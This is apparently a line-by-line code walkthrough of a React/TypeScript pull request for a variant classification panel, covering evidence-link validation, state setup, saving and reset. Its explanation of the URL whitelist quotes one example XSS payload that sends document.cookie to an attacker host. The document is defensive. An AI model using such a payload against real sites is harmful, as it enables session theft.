18 isValidEvidenceLink

The security cornerstone of this PR. Every evidence link — whether typed by a user or loaded from the server — passes through this function before reaching the DOM.

isValidEvidenceLink CriterionRow.tsx · lines 4–10 · Invariant 3 enforcement 
export function isValidEvidenceLink(url: string): boolean {
  try {
    const parsed = new URL(url.trim());  // ①
    return parsed.protocol === "http:"    // ②
        || parsed.protocol === "https:";  // ③
  } catch {                               // ④
    return false;                        // ⑤
  }
}
①
new URL(url.trim()) — The browser's WHATWG-compliant URL parser. trim() strips accidental leading/trailing whitespace before parsing. The constructor throws a TypeError for any input that cannot be parsed as a URL — this is the failure path for relative URLs, bare words, and malformed strings. Importantly, it does NOT throw for javascript:alert(1) — that parses cleanly with protocol "javascript:".
②
parsed.protocol === "http:" — Note the colon: the WHATWG URL standard includes the trailing colon in the protocol property. new URL("http://x.com").protocol returns "http:", not "http". This comparison works correctly because of that.
③
Strict whitelist, not a blacklist. Only "http:" and "https:" are allowed. Everything else — "javascript:", "data:", "ftp:", "blob:", "file:", custom schemes — returns false. A blacklist approach ("block javascript:") would need constant maintenance as new dangerous schemes are discovered.
④
The catch block has no binding (catch { not catch (e) {). This is ES2019+ syntax — perfectly valid TypeScript. We deliberately ignore the error value since the only thing we need to know is that parsing failed, and we always return the same thing regardless of why it failed.
⑤
return false — Any input that the URL constructor cannot parse (relative URLs like "../evil", empty strings, plain text like "just notes") reaches here and is rejected. The user will see the inline linkError message and the link will not be added to state.
What this prevents

Without this guard, a user could type javascript:fetch('https://attacker.com?c='+document.cookie) as an evidence link. When the saved classification is loaded by another analyst, the link would appear as a clickable anchor tag. One click executes the JavaScript in the victim's browser session, exfiltrating their session cookies or API key. The isValidEvidenceLink check prevents this link from ever reaching the href attribute at all.

19 initCriteriaState

Called on mount (with server data), on framework switch (with empty existing), and on reset (with empty existing). The evidence link re-validation in this function is the second enforcement point for Invariant 3.

initCriteriaState ClassificationPanel.tsx · lines ~39–60 · Init + Security 
function initCriteriaState(
  defs: CriterionDef[],
  existing: Partial<CriterionDetail>[]
): CriterionState[] {
  return defs.map((def) => {
    const e = existing.find(          // ①
      (c) => c.criterion_code === def.code
    );
    const rawLinks = e?.evidence_links ?? [];  // ②
    const safeLinks = rawLinks.filter(          // ③
      isValidEvidenceLink
    );
    return {                                    // ④
      criterion_code: def.code,
      applied: e?.applied ?? false,             // ⑤
      strength: e?.strength ?? def.default_strength, // ⑥
      notes: e?.notes ?? "",
      evidence_links: safeLinks,                 // ⑦
      pre_computed: e?.pre_computed ?? false,
      pre_computed_value: e?.pre_computed_value ?? null,
    };
  });
}
①
existing.find(c => c.criterion_code === def.code) — Linear search through the existing criteria array for a matching code. This is O(n²) in the worst case (28 defs × 28 existing entries = 784 comparisons), but with a maximum of 28 criteria this is negligible. The code is clearer than a pre-built Map for this scale.
②
e?.evidence_links ?? [] — Optional chaining (e?.) safely returns undefined if e is undefined (no existing entry for this criterion). The ?? [] nullish coalescing then provides an empty array default. This handles both "new classification" (e is undefined) and "existing classification where links were not saved" (e.evidence_links is null/undefined).
③
rawLinks.filter(isValidEvidenceLink) — Re-validates every link from the server. Passing the function directly as a callback (rather than wrapping in an arrow function) is slightly more efficient and cleaner to read. Any link that fails the protocol check is silently dropped — this is the right behaviour because the alternative (throwing an error) would break loading of an otherwise valid classification. The comment in the source explains the threat model: "a valid API key holder could inject javascript: URLs via API".
④
The return object is constructed fresh every call. This is important for the reset path — initCriteriaState(defs, []) creates 28 new objects with all defaults. Because React's state update is a reference comparison, new objects will always trigger a re-render, ensuring the reset is visible. If the function returned the same object references, React might bail out thinking nothing changed.
⑤
e?.applied ?? false — Defaults to false (unapplied) when there is no existing entry or when applied is null/undefined. Note: ?? false is correct here (not || false) because false itself must be preserved — if e.applied is explicitly false, we want to keep it false, not fall through to the default.
⑥
e?.strength ?? def.default_strength — When loading a saved classification the stored strength is used. When initialising fresh (or resetting), the criterion's own default_strength from the JSON config is used. This ensures a fresh panel always starts with the ACGS-specified default strength for each criterion.
⑦
evidence_links: safeLinks — Uses the filtered array, not the raw array. This is the output of the security step at ③. Any javascript: or data: URLs that somehow made it into the database are dropped here, before they enter React state, and therefore before they could ever be rendered as href attributes.

20 updateCriterion

The callback passed to every CriterionRow. Its useCallback([], []) wrapping is the reason ClassificationPanel can render 28 CriterionRow components without cascade re-renders.

updateCriterion ClassificationPanel.tsx · ~lines 115–126 · useCallback 
const updateCriterion = useCallback(     // ①
  (code: string, updates: Partial<CriterionState>) => {
    setCriteria((prev) =>               // ②
      prev.map((c) =>
        c.criterion_code === code
          ? { ...c, ...updates }         // ③
          : c
      )
    );
    if ("applied" in updates)           // ④
      setFrameworkLocked(true);
  },
  []                                     // ⑤
);
①
useCallback(..., []) — Creates the function once and never recreates it. This is safe because the function does not use any component-scoped variables directly — it only calls setCriteria and setFrameworkLocked, which are stable state setter references provided by React.
②
Functional update form: setCriteria((prev) => ...) — Critical. Because updateCriterion is created once with empty deps, it does not have access to the current criteria state in its closure. If it did setCriteria([...criteria.map(...)]), it would use the stale 28-element array from mount time. The functional form prev => receives the current state at call time from React's scheduler, bypassing the stale closure entirely.
③
{ ...c, ...updates } — Spread merge: creates a new object with all of c's properties, then overrides any that appear in updates. This is a shallow merge, which is correct here because CriterionState's evidence_links array is replaced wholesale (not mutated), and the other fields are all primitives.
④
"applied" in updates — The in operator checks whether the key exists in the object, not whether its value is truthy. This fires for both onChange({applied: true}) and onChange({applied: false}). The framework should lock on the first interaction with any checkbox — regardless of direction. If this were updates.applied === true, checking then unchecking a criterion would leave the framework unlocked.
⑤
Empty dependency array. No re-creation ever. The contract this creates: callers can safely pass this to CriterionRow's onChange prop knowing it will never change reference, so React's prop equality check for CriterionRow will always pass (no false re-renders from a new callback object each render).

21 save()

The single function handling both draft and confirmed saves. The entire draft/confirm distinction reduces to one ternary on locked_by.

save ClassificationPanel.tsx · ~lines 130–150 · async API call 
async function save(lock: boolean) {
  setSaving(true);                             // ①
  setSaveError(null);
  try {
    const result = await putClassification(variantId, {
      framework,
      user_id: userId,
      locked_by: lock ? userId : null,         // ②
      criteria: criteria.map((c) => ({
        criterion_code: c.criterion_code,
        applied: c.applied,
        strength: c.strength,
        notes: c.notes || undefined,           // ③
        evidence_links: c.evidence_links.length > 0
          ? c.evidence_links
          : undefined,                          // ④
      })),
    });
    setClassId(result.classification_id);      // ⑤
    if (lock) setLockedAt(new Date().toISOString()); // ⑥
  } catch (err) {
    setSaveError(                               // ⑦
      err instanceof Error ? err.message : "Save failed"
    );
  } finally {
    setSaving(false);                          // ⑧
  }
}
①
setSaving(true) first, setSaveError(null) second. This order matters. Setting saving first disables the Save/Confirm buttons in the next render, preventing double-submission. Clearing saveError removes any previous error banner — the user should not see stale errors while a new attempt is in flight.
②
locked_by: lock ? userId : null — The entire draft/confirm distinction. When null, the backend stores NULL in locked_at (draft). When a non-null string, the backend stores NOW() in locked_at (confirmed). The Pydantic validator on the backend rejects empty strings, so userId must be a non-empty string — it is initialized as import.meta.env.VITE_USER_ID ?? "analyst".
③
c.notes || undefined — An empty string is falsy in JavaScript, so "" || undefined returns undefined. When serialised to JSON, undefined values in object properties are omitted entirely. This keeps the request payload clean: empty notes fields do not appear in the JSON body at all, matching the API schema where notes is Optional[str].
④
c.evidence_links.length > 0 ? c.evidence_links : undefined — Same principle: empty arrays are omitted from the JSON body. This is a minor bandwidth optimisation but also ensures the API receives a clean null/absent rather than an empty array for criteria with no links.
⑤
setClassId(result.classification_id) — After the first save (whether draft or confirm), classId is set. Subsequent saves will still call PUT /api/variants/{id}/classification, which soft-deletes the previous record and inserts a new one. The classId is used in handleReset as the ID to pass to the DELETE endpoint. Without this, a reset attempt after a draft save would fail the if (!classId) return guard.
⑥
setLockedAt(new Date().toISOString()) — only on confirm. This is the client clock, not the server's locked_at value. It is used only for the "Confirmed DD/MM/YYYY" display label. The server's actual timestamp (stored in the DB) is the authoritative value for audit purposes. Using the client clock here avoids a round-trip to fetch the server timestamp after a successful save.
⑦
err instanceof Error ? err.message : "Save failed" — This works correctly because the test mock uses the real ApiError class (which extends Error) via the partial mock factory. For a network error, the browser's fetch() throws a real TypeError (extends Error). The fallback string handles the pathological case where something throws a non-Error (e.g. a string).
⑧
setSaving(false) in finally. The finally block runs regardless of success or failure. Without it, a failed save would leave saving: true permanently, disabling the buttons and making the panel unusable. The state update in finally always runs, even if the catch block itself throws.

22 handleReset()

The most complex async flow in this PR — it must carefully distinguish between "success: wipe all state" and "failure: close the confirm dialog but leave everything else intact".

handleReset ClassificationPanel.tsx · ~lines 152–170 · async API call 
async function handleReset() {
  if (!classId) return;                    // ①
  setSaving(true);
  setSaveError(null);
  try {
    await apiReset(variantId, classId, userId); // ②
    setClassId(null);                        // ③
    setLockedAt(null);
    setFrameworkLocked(false);
    setCriteria(initCriteriaState(defs, []));
    setShowResetConfirm(false);
  } catch (err) {
    setSaveError(                            // ④
      err instanceof Error ? err.message : "Reset failed"
    );
    setShowResetConfirm(false);             // ⑤
  } finally {
    setSaving(false);
  }
}
①
if (!classId) return — Guard against calling the reset endpoint with no classification to reset. This should not be reachable in normal use (the Reset button is only rendered when !!lockedAt, and lockedAt is only set after a successful save which also sets classId) — but it's a defensive check against unusual state sequences.
②
apiReset(variantId, classId, userId) — Calls DELETE /api/variants/{variantId}/classification/{classId} with {user_id: userId} body. The backend soft-deletes the existing classification record and inserts a blank replacement (preserving the audit trail). The backend may return 409 if another user deleted the same classification concurrently — this surfaces as an ApiError caught at ④.
③
Success: five state updates in sequence. React batches these (React 18 automatic batching) into a single re-render. After batching: classId=null (reset endpoint gets a new blank ID from the backend, but we don't need it here), lockedAt=null (unlocks panel, shows Save/Confirm), frameworkLocked=false (re-enables framework selector), criteria=[blank defaults] (28 fresh CriterionState objects), showResetConfirm=false (hides the confirm row). The result is a completely blank panel.
④
setSaveError in the catch. The error message from the API (e.g. "Concurrent modification: classification already deleted, please retry") is surfaced in the red banner below the panel header. The panel remains in its locked state — the lockedAt state variable is unchanged, so Save/Confirm remain hidden and the Reset button remains visible.
⑤
setShowResetConfirm(false) in the catch — the deliberate asymmetry. On success, this is also called. But in the catch, it closes the "Yes reset / Cancel" confirmation row without clearing any other state. If this were NOT called on failure, the analyst would see: error banner visible + "Yes reset / Cancel" row still visible — two calls-to-action at the same time, which is confusing. Closing the confirm row on failure forces the analyst back to the clean "Reset classification" button, where they can retry consciously.
Backend reset contract

The backend's DELETE endpoint does not physically delete the classification row. It soft-deletes it (UPDATE ... SET deleted_at=NOW()) and inserts a new blank row. This preserves the full audit trail — the original classification, score, and criteria remain in the database with a deleted_at timestamp, queryable for audit purposes. The new blank row becomes the "active" classification for the variant. A 409 response means another request (possible concurrent session) soft-deleted the same row between the panel's initial GET and this DELETE — the error message instructs the analyst to retry.
